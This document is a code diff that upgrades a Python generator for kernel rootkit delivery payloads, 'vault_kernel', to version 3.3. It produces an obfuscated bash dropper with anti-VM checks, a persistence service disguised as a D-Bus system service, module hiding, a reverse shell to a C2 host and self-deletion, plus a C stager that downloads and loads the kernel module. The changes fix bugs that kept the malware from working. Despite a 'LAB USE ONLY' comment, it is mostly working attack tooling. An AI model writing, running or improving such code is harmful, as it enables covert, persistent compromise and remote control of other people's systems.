@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-vault_kernel Payload Generator v3.2
+vault_kernel Payload Generator v3.3
 Interactive builder for kernel rootkit delivery payloads.
 Auto-detects local IP, generates obfuscated multi-format payloads
 with anti-VM evasion and persistence.
@@ -58,9 +58,10 @@ if _anti_vm; then exit 0; fi
 # ================================================================
 PERSISTENCE = r"""
 _persist() {
-    local T="$1"
+    local KO_PATH="$1"
     local INSTALLED=0
-    if command -v systemctl >/dev/null 2>&1; then
+    # Persistence needs root; skip silently when dry-running as user.
+    if [ "$(id -u)" = "0" ] && command -v systemctl >/dev/null 2>&1; then
         cat > /etc/systemd/system/dbus-system.service << 'SVC'
 [Unit]
 Description=D-Bus System Message Bus
@@ -68,21 +69,21 @@ After=network.target
 [Service]
 Type=oneshot
 ExecStartPre=/bin/sleep 30
-ExecStart=/sbin/insmod SVC
+ExecStart=/sbin/insmod __KO_PATH__
 RemainAfterExit=yes
 [Install]
 WantedBy=multi-user.target
 SVC
-        sed -i "s|SVC|${T}/vault_kernel.ko|" /etc/systemd/system/dbus-system.service
+        sed -i "s|__KO_PATH__|${KO_PATH}|" /etc/systemd/system/dbus-system.service
         systemctl daemon-reload 2>/dev/null || true
         systemctl enable dbus-system.service 2>/dev/null && INSTALLED=1
     fi
-    if [ "$INSTALLED" = "0" ] && [ -f /etc/rc.local ]; then
+    if [ "$INSTALLED" = "0" ] && [ "$(id -u)" = "0" ] && [ -f /etc/rc.local ]; then
         grep -q vault_kernel /etc/rc.local 2>/dev/null || \
-            echo "/sbin/insmod ${T}/vault_kernel.ko" >> /etc/rc.local
+            echo "/sbin/insmod ${KO_PATH}" >> /etc/rc.local
     fi
 }
-_persist "$T"
+_persist "$WORKDIR/vault_kernel.ko"
 """
 
 # ================================================================
@@ -102,19 +103,32 @@ def build_bash(host, port, xorkey="", anti_vm=True, persistence=True, obfuscate=
     if obfuscate and xorkey:
         raw = xor(raw, xorkey.encode())
         b64 = base64.b64encode(raw).decode()
-        decode = f'python3 -c "import sys;d=sys.stdin.buffer.read();k=b\'{xorkey}\';sys.stdout.buffer.write(bytes(d[i]^k[i%len(k)] for i in range(len(d))))"'
-        extract = f'echo "$T" | base64 -d | {decode} | tar xzf -'
+        # Key is embedded as hex so quotes/backslashes in custom keys
+        # can never break the generated python one-liner.
+        decode = (f'python3 -c "import sys;d=sys.stdin.buffer.read();'
+                  f'k=bytes.fromhex(\'{xorkey.encode().hex()}\');'
+                  f'sys.stdout.buffer.write(bytes(d[i]^k[i%len(k)] for i in range(len(d))))"')
+        extract = 'printf "%s" "$PAYLOAD_B64" | base64 -d | ' + decode + ' | tar xzf -'
     else:
         b64 = base64.b64encode(raw).decode()
-        decode = ""
-        extract = 'echo "$T" | base64 -d | tar xzf -'
+        extract = 'printf "%s" "$PAYLOAD_B64" | base64 -d | tar xzf -'
 
     script = f'''#!/bin/bash
-# vault_kernel dropper v3.2 — kernel rootkit implant
+# vault_kernel dropper v3.3 — kernel rootkit implant (LAB USE ONLY)
+#
+# v3.3 fix: v3.2 reused the variable T for BOTH the work directory and
+# the base64 payload, so "mkdir -p $T" expanded to a multi-hundred-KB
+# blob and the dropper died on its first step.  Payload now lives in
+# PAYLOAD_B64, the workdir in WORKDIR.
+#
+# Dry-run without touching the kernel (lab CI):
+#   INSMOD=/bin/true bash dropper.sh
 set -e
-export T="/tmp/.$(head -c6 /dev/urandom|base64|tr -dc a-z0-9|head -c8)"
+
+export WORKDIR="/tmp/.$(head -c6 /dev/urandom|base64|tr -dc a-z0-9|head -c8)"
 export H="{host}" P="{port}"
-T="{b64}"
+PAYLOAD_B64="{b64}"
+INSMOD="${{INSMOD:-/sbin/insmod}}"
 
 _s(){{ logger -t "systemd-coredump" "$1" 2>/dev/null||true; }}
 
@@ -127,7 +141,7 @@ command -v gcc >/dev/null 2>&1||{{ apt-get update -qq&&apt-get install -y -qq bu
 
 # Extract & build
 _s "extract"
-mkdir -p "$T"&&cd "$T"
+mkdir -p "$WORKDIR"&&cd "$WORKDIR"
 {extract}
 _s "build"
 make clean >/dev/null 2>&1||true
@@ -135,7 +149,7 @@ make >/dev/null 2>&1||{{ _s "build failed";exit 1; }}
 
 # Load
 _s "load"
-/sbin/insmod vault_kernel.ko 2>/dev/null
+"$INSMOD" "$WORKDIR/vault_kernel.ko" 2>/dev/null||{{ _s "insmod failed (need root + headers)";exit 1; }}
 for i in $(seq 1 10);do [ -e /dev/vault_kernel ]&&break;sleep 0.1;done
 
 # Hide module + trigger shell
@@ -145,7 +159,7 @@ fd=os.open('/dev/vault_kernel',2)
 fcntl.ioctl(fd,(0<<30)|(0xC0<<8)|0x0D)
 os.close(fd)
 fd=os.open('/dev/vault_kernel',2)
-buf=b'$H:$P\x00'.ljust(256,b'\x00')
+buf=b'$H:$P\\x00'.ljust(256,b'\\x00')
 fcntl.ioctl(fd,(1<<30)|(256<<16)|(0xC0<<8)|0x0B,buf)
 os.close(fd)
 " 2>/dev/null||true
@@ -158,10 +172,10 @@ _s "shell triggered -> $H:$P"
 python3 -c "
 import fcntl,os
 fd=os.open('/dev/vault_kernel',2)
-fcntl.ioctl(fd,(1<<30)|(256<<16)|(0xC0<<8)|0x02,'$(basename "$T")\x00'.ljust(256,b'\x00'))
+fcntl.ioctl(fd,(1<<30)|(256<<16)|(0xC0<<8)|0x02,'$(basename "$WORKDIR")\\x00'.ljust(256,b'\\x00'))
 os.close(fd)
 " 2>/dev/null||true
-rm -f "$0" 2>/dev/null||true
+cd / && rm -rf "$WORKDIR" && rm -f "$0" 2>/dev/null||true
 _s "done"
 exit 0
 '''
@@ -208,7 +222,7 @@ except Exception as e:print(f"[-] {{e}}")
 # ================================================================
 def build_c(host, port):
     return f'''/*
- * vault_kernel stager v3.2 — minimal C downloader/loader
+ * vault_kernel stager v3.3 — minimal C downloader/loader
  * Compile: gcc -O2 -s -o stager stager.c -static
  * Size: ~15KB static, ~8KB dynamic
  */
@@ -236,19 +250,32 @@ def build_c(host, port):
 
 static int download(const char *url, unsigned char **out, size_t *olen) {{
     char host[256], path[512], request[1024];
-    int port, sock, n;
+    int port = 80, sock, n;
     struct hostent *he;
     struct sockaddr_in addr;
+    unsigned char *resp = NULL, *payload;
     unsigned char buf[4096];
-    size_t total = 0;
+    size_t total = 0, cap = 0, i, blen;
+    const char *p, *body = NULL;
 
     *out = NULL;
     *olen = 0;
 
-    if (sscanf(url, "http://%255[^:/]%d%511s", host, &port, path) < 1)
-        if (sscanf(url, "http://%255[^/]%511s", host, path) < 1) return -1;
-    if (port <= 0 || port > 65535) port = 80;
-    if (path[0] == '\\0') strcpy(path, "/");
+    /* Parse http://host[:port]/path by hand.  scanf's %d stops at the
+     * ':' separator, so the v3.2 sscanf NEVER parsed the port and left
+     * it uninitialized (using garbage or silently defaulting to 80). */
+    if (strncmp(url, "http://", 7) != 0) return -1;
+    p = url + 7;
+    while (*p && *p != ':' && *p != '/' && (size_t)(p - (url + 7)) < sizeof(host) - 1) p++;
+    if (p == url + 7) return -1;
+    memcpy(host, url + 7, (size_t)(p - (url + 7)));
+    host[p - (url + 7)] = '\\0';
+    if (*p == ':') {{
+        port = atoi(p + 1);
+        if (port <= 0 || port > 65535) return -1;
+        while (*p && *p != '/') p++;
+    }}
+    snprintf(path, sizeof(path), "%s", *p ? p : "/");
 
     he = gethostbyname(host);
     if (!he || !he->h_addr_list[0]) return -1;
@@ -266,34 +293,45 @@ static int download(const char *url, unsigned char **out, size_t *olen) {{
     snprintf(request, sizeof(request),
         "GET %s HTTP/1.1\\r\\nHost: %s\\r\\n"
         "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\\r\\n"
-        "Accept: text/html\\r\\nConnection: close\\r\\n\\r\\n",
+        "Accept: */*\\r\\nConnection: close\\r\\n\\r\\n",
         path, host);
 
-    write(sock, request, strlen(request));
+    if (write(sock, request, strlen(request)) < 0) {{ close(sock); return -1; }}
 
+    /* Buffer the WHOLE response, then split the headers exactly once.
+     * The v3.2 per-chunk strstr() appended HTTP headers (or header
+     * fragments) into the .ko whenever the \\r\\n\\r\\n boundary landed
+     * between two read() calls — the downloaded module never loaded. */
     for (;;) {{
-        n = read(sock, buf, sizeof(buf));
-        if (n <= 0) break;
-
-        char *body = strstr((char *)buf, "\\r\\n\\r\\n");
-        if (body) {{
-            body += 4;
-            size_t hdr_len = body - (char *)buf;
-            if ((size_t)n > hdr_len) {{
-                size_t blen = n - hdr_len;
-                *out = realloc(*out, total + blen);
-                memcpy(*out + total, body, blen);
-                total += blen;
-            }}
-            if (n > hdr_len) continue;
+        if (total + sizeof(buf) > cap) {{
+            cap = (total + sizeof(buf)) * 2;
+            resp = realloc(resp, cap);
+            if (!resp) {{ close(sock); return -1; }}
         }}
-        *out = realloc(*out, total + n);
-        memcpy(*out + total, buf, n);
-        total += n;
+        n = read(sock, resp + total, sizeof(buf));
+        if (n <= 0) break;
+        total += (size_t)n;
     }}
     close(sock);
-    if (total == 0 || !*out) return -1;
-    *olen = total;
+    if (total < 16) {{ free(resp); return -1; }}
+
+    for (i = 0; i + 4 <= total; i++) {{
+        if (resp[i] == '\\r' && resp[i+1] == '\\n' && resp[i+2] == '\\r' && resp[i+3] == '\\n') {{
+            body = (const char *)resp + i + 4;
+            break;
+        }}
+    }}
+    if (!body) {{ free(resp); return -1; }}
+
+    blen = total - (size_t)(body - (const char *)resp);
+    if (blen == 0) {{ free(resp); return -1; }}
+    payload = malloc(blen);
+    if (!payload) {{ free(resp); return -1; }}
+    memcpy(payload, body, blen);
+    free(resp);
+
+    *out = payload;
+    *olen = blen;
     return 0;
 }}
 
@@ -315,20 +353,26 @@ int main(int argc, char **argv) {{
     printf("[+] Downloaded %zu bytes\\n", len);
 
     /* Write .ko */
-    snprintf(ko, sizeof(ko), "/tmp/.%.8s.ko", argv[0] + (strlen(argv[0]) > 10 ? strlen(argv[0]) - 10 : 0));
+    snprintf(ko, sizeof(ko), "/tmp/.vk_%d.ko", (int)getpid());
     fd = open(ko, O_WRONLY|O_CREAT|O_TRUNC, 0600);
     if (fd < 0) {{ perror("open"); free(data); return 1; }}
     write(fd, data, len);
     close(fd);
     free(data);
 
-    /* Load via insmod */
-    pid = fork();
-    if (pid == 0) {{
-        execl("/sbin/insmod", "insmod", ko, NULL);
-        _exit(1);
+    /* Load via insmod — INSMOD env var overrides the path so lab
+     * dry-runs can substitute /bin/true and exercise the stager
+     * without loading anything. */
+    {{
+        const char *insmod = getenv("INSMOD");
+        if (!insmod || !*insmod) insmod = "/sbin/insmod";
+        pid = fork();
+        if (pid == 0) {{
+            execl(insmod, "insmod", ko, NULL);
+            _exit(127);
+        }}
+        waitpid(pid, &status, 0);
     }}
-    waitpid(pid, &status, 0);
     if (WEXITSTATUS(status) != 0) {{
         fprintf(stderr, "[-] insmod failed (exit=%d)\\n", WEXITSTATUS(status));
         unlink(ko);
@@ -368,7 +412,7 @@ int main(int argc, char **argv) {{
 # ================================================================
 def cli():
     import argparse
-    p = argparse.ArgumentParser(description="vault_kernel v3.2 Payload Generator")
+    p = argparse.ArgumentParser(description="vault_kernel v3.3 Payload Generator")
     p.add_argument("--host", help="C2 IP for reverse shell callback")
     p.add_argument("--port", default="4444", help="C2 port")
     p.add_argument("--format", choices=["bash","python","c","all"], default="bash")
@@ -413,7 +457,7 @@ def cli():
 # ================================================================
 def interactive():
     print("""
-  vault_kernel — Payload Generator v3.2
+  vault_kernel — Payload Generator v3.3
   ruby570bocadito (c) 2026
 """)
     local_ip = get_local_ip()
